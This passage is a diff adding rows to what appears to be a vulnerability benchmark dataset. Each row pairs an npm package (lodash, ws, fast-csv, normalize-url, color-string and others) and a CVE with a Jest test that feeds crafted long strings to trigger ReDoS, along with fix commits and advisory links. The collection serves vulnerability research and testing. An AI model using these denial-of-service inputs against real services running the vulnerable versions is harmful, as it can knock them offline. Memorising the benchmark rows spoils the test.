+    } catch (e) {}
+  });
+  let time = t[0] + t[1] / 1000000000;
+  expect(time).toBeGreaterThan(1);
+});
+",https://github.com/postcss/postcss/commit/2b1d04c867995e55124e0a165b7c6622c1735956,previous-map.js:57:27,https://security.snyk.io/vuln/SNYK-JS-POSTCSS-1255640; https://github.com/advisories/GHSA-566m-qj78-rww5
+redos,CVE-2017-16117,slug,0.9.1,0.9.2,redos/slug_0.9.1,"test(""ReDos in slug"", () => {
+  const genstr = require(""../utils"").genstr;
+  const measureTime = require(""../utils"").measureTime;
+  const slug = require(""slug"");
+  let t = measureTime(function () {
+    slug(""\u2665"" + genstr(50000, "" "") + ""\u2665"");
+  });
+  let time = t[0] + t[1] / 1000000000;
+  expect(time).toBeGreaterThan(1);
+});
+",https://github.com/zhuangya/node-slug/commit/e82fccc6b3d850227560db659b17df0e242ae51b,slug.js:64:21,https://security.snyk.io/vuln/npm:slug:20170907; https://github.com/advisories/GHSA-jxqq-cqm6-pfq9
+redos,,mobile-detect,1.3.6,1.4.0,redos/mobile-detect_1.3.6,"test(""ReDos in mobile-detect"", () => {
+  const genstr = require(""../utils"").genstr;
+  const measureTime = require(""../utils"").measureTime;
+  const MobileDetect = require(""mobile-detect"");
+  let t = measureTime(function () {
+    let md = new MobileDetect(genstr(12500, ""Dell""));
+    md.phone();
+  });
+  let time = t[0] + t[1] / 1000000000;
+  expect(time).toBeGreaterThan(1);
+});
+",https://github.com/hgoebl/mobile-detect.js/commit/7222f6e75cf8cd90e1dc53e445716203eaf79d8a,mobile-detect.js:375:32,https://security.snyk.io/vuln/npm:mobile-detect:20170907; 
+redos,CVE-2020-28500,lodash,4.17.4,4.17.21,redos/lodash_4.17.4,"test(""ReDos in lodash"", () => {
+  const genstr = require(""../utils"").genstr;
+  const measureTime = require(""../utils"").measureTime;
+  const _ = require(""lodash"");
+  let t = measureTime(function () {
+    let agent = _.lowerCase(genstr(50000, ""A""));
+  });
+  let time = t[0] + t[1] / 1000000000;
+  expect(time).toBeGreaterThan(1);
+});
+",https://github.com/lodash/lodash/commit/c4847ebe7d14540bb28a8b932a9ce1b9ecbfee1a,lodash.js:1172:29,https://security.snyk.io/vuln/SNYK-JS-LODASH-1018905; https://github.com/advisories/GHSA-29mw-wpgm-hmr9
+redos,CVE-2020-26256,fast-csv,4.3.5,4.3.6,redos/fast-csv_4.3.5,"test(""ReDos in fast-csv"", () => {
+  const csv = require(""fast-csv"");
+  let str1 = "" "".repeat(30000) + ""x\n"";
+  let start = process.hrtime();
+  const stream = csv
+    .parse({
+      ignoreEmpty: true,
+      delimiter: ""\t"",
+    })
+    .on(""error"", (error) => {})
+    .on(""data"", () => {})
+    .on(""end"", () => {
+      var t = process.hrtime(start);
+      let time = t[0] + t[1] / 1000000000;
+      expect(time).toBeGreaterThan(1);
+    });
+  stream.write(str1);
+  stream.end();
+});
+",https://github.com/C2FO/fast-csv/commit/4bbd39f26a8cd7382151ab4f5fb102234b2f829e,Parser.js:69:64,https://security.snyk.io/vuln/SNYK-JS-FASTCSV-1049538; https://github.com/advisories/GHSA-8cv5-p934-3hwp
+redos,CVE-2021-33502,normalize-url,6.0.0,6.0.1,redos/normalize-url_6.0.0,"test(""ReDos in parsejson"", () => {
+  const measureTime = require(""../utils"").measureTime;
+  const normalizeUrl = require(""normalize-url"");
+  let t = measureTime(function () {
+    try {
+      normalizeUrl(""data:"" + "",#"".repeat(1000) + ""\nx"");
+    } catch (e) {}
+  });
+  let time = t[0] + t[1] / 1000000000;
+  expect(time).toBeGreaterThan(1);
+});
+",https://github.com/sindresorhus/normalize-url/commit/b1fdb5120b6d27a88400d8800e67ff5a22bd2103,index.js:12:68,https://security.snyk.io/vuln/SNYK-JS-NORMALIZEURL-1296539; https://github.com/advisories/GHSA-px4h-xg32-q955
+redos,,dirty-json,0.4.0,0.5.2,redos/dirty-json_0.4.0,"test(""ReDoS in dirty-json"", () => {
+  const dJSON = require(""dirty-json"");
+  const measureTime = require(""../utils"").measureTime;
+  let t = measureTime(function () {
+    dJSON.parse(`{ test: ""${""x"".repeat(24)}\\`);
+  });
+  let time = t[0] + t[1] / 1000000000;
+  expect(time).toBeGreaterThan(1);
+});
+",https://github.com/RyanMarcus/dirty-json/commit/0b9c15e26699538a11e08e0f168af558392dadbe,utils.js:391:28,https://security.snyk.io/vuln/npm:dirty-json:20180213; 
+redos,CVE-2021-32640,ws,7.0.0,7.4.6,redos/ws_7.0.0,"test(""ReDos in ws"", () => {
+  const genstr = require(""../utils"").genstr;
+  const measureTime = require(""../utils"").measureTime;
+  const attack_str = ""b"" + "" "".repeat(42000) + ""x"";
+  let t = measureTime(function () {
+    attack_str.trim().split(/ *, */);
+  });
+  let time = t[0] + t[1] / 1000000000;
+  expect(time).toBeGreaterThan(1);
+});
+",https://github.com/websockets/ws/commit/00c425ec77993773d823f018f64a5c44e17023ff,jasmineAsyncInstall.js:106:37,https://security.snyk.io/vuln/SNYK-JS-WS-1296835; https://github.com/advisories/GHSA-6fc8-4gx4-v693
+redos,CVE-2017-16113,parsejson,0.0.3,n/a,redos/parsejson_0.0.3,"test(""ReDos in parsejson"", () => {
+  const genstr = require(""../utils"").genstr;
+  const measureTime = require(""../utils"").measureTime;
+  const parsejson = require(""parsejson"");
+  let t = measureTime(function () {
+    parsejson('{""a"":""' + genstr(50000, "" "") + '""}');
+  });
+  let time = t[0] + t[1] / 1000000000;
+  expect(time).toBeGreaterThan(1);
+});
+",n/a,index.js:20:38,https://security.snyk.io/vuln/npm:parsejson:20170908; https://github.com/advisories/GHSA-q75g-2496-mxpp
+redos,CVE-2021-29060,color-string,1.5.4,1.5.5,redos/color-string_1.5.4,"test(""ReDoS in color-string"", () => {
+  const measureTime = require(""../utils"").measureTime;
+  const colorString = require(""color-string"");
+  let attack_str = ""hwb("" + ""1"".repeat(50000) + ""!"";
+  let t = measureTime(function () {
+    colorString.get(attack_str);
+  });
+  let time = t[0] + t[1] / 1000000000;
+  expect(time).toBeGreaterThan(1);
+});
+",https://github.com/Qix-/color-string/commit/0789e21284c33d89ebc4ab4ca6f759b9375ac9d3,index.js:154:21,https://security.snyk.io/vuln/SNYK-JS-COLORSTRING-1082939; https://github.com/advisories/GHSA-257v-vj4p-3w2h
